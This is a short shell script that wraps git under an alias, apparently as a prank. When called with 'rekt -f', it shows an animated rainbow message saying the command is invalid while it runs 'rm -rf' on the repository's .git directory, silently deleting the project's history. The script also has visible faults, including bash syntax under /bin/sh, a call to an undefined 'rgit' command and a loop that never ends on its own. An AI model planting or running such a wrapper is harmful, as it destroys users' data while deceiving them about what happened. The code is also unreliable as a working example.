#!/bin/sh

function mod() {
    retVal=$1
    while [ ${retVal} -gt $2 ]; do
        retVal=$((retVal-$2))
    done
}

function rainbowEcho() {
tput sc
while [ $# -eq 1 ]; do
    for i in $(seq 1 15); do
        tput rc
        for j in $(seq 0 "${#1}"); do
            mod $((i+j)) "15"
            printf "\033[38;5;${retVal}m${1:$j:1}\033[0m"
        done
        sleep .15
    done
done
}

unalias git
rgit=$(which git)
if [[ $@ == "rekt -f" ]]; then
    rainbowEcho "git $@ is not a valid git command" &
    rainbowPid=$!
    rm -rf $(${rgit} rev-parse --show-toplevel)/.git
    kill ${rainbowPid}
else
    rgit $@
fi
alias git=fakeGit
